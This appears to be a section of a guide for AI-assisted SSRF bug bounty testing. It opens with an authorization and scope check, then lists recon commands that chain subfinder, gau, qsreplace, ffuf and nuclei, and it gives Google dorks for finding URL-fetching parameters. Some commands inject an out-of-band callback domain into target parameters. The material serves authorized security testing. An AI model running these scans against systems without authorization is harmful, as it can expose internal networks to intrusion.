## Phase 0 — Scope check (always first)

SSRF sends traffic from the target's servers into its internal network, so it has more blast radius than most web bugs. Before generating test commands, confirm:

- The target is in scope for a program the user is enrolled in, or there is written pentest authorization.
- The program's rules allow SSRF/internal testing (some forbid metadata or internal hosts).
- Automated scanning rates fit the program's limits.

If scope hasn't been mentioned, ask once, briefly. If the target clearly isn't the user's to test and there's no authorization, don't help attack it.

---

## Phase 1 — Recon: find candidate endpoints

Goal: a deduplicated list of URLs and features that make the server fetch something.

```bash
# Live subdomains + tech fingerprint
subfinder -d target.com -all -silent | httpx-toolkit -silent -sc -title -tech-detect -o live_assets.txt

# Historical URLs filtered to SSRF-looking params
cat live_assets.txt | gau --threads 10 | gf ssrf | uro | tee ssrf_candidates.txt

# Quick OOB sweep: replace param values with your callback domain
cat ssrf_candidates.txt | qsreplace "http://YOUR_ID.oast.fun" | httpx-toolkit -silent -mc 200 -cl

# Hidden parameter discovery
ffuf -u "https://target.com/endpoint?FUZZ=http://YOUR_ID.oast.fun" -w ssrf_params.txt

# Nuclei with interactsh
nuclei -l ssrf_candidates.txt -tags ssrf
```

Google dorks (combine with `OR`):
```
site:*.target.com inurl:"url="
site:*.target.com inurl:"callbackUrl=http"
site:*.target.com inurl:"proxy?path="
site:*.target.com inurl:"img_url="
site:*.target.com inurl:"returnUrl="
site:*.target.com inurl:"fetch?uri="
site:*.target.com inurl:"src=http"
```

